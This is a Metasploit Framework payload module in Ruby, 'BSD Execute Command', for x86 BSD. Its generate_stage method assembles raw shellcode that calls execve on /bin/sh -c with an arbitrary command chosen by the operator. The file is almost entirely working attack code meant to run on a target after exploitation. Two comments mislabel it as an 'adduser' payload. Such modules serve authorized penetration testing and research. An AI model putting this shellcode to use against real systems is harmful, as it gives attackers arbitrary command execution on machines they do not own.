##
# $Id: exec.rb 6479 2009-04-13 14:33:26Z kris $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


###
#
# Exec
# ----
#
# Executes an arbitrary command.
#
###
module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Bsd

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'BSD Execute Command',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Execute an arbitrary command',
			'Author'        => 'vlad902',
			'License'       => MSF_LICENSE,
			'Platform'      => 'bsd',
			'Arch'          => ARCH_X86))

		# Register adduser options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
			], self.class)
	end

	#
	# Dynamically builds the adduser payload based on the user's options.
	#
	def generate_stage
		cmd     = datastore['CMD'] || ''
		payload =
			"\x6a\x3b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52" +
			"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3" +
			"\x52" +
			Rex::Arch::X86.call(cmd.length) + cmd + "\x00"     +
			"\x57\x53\x89\xe1\x52\x51\x53\x50\xcd\x80"
	end

end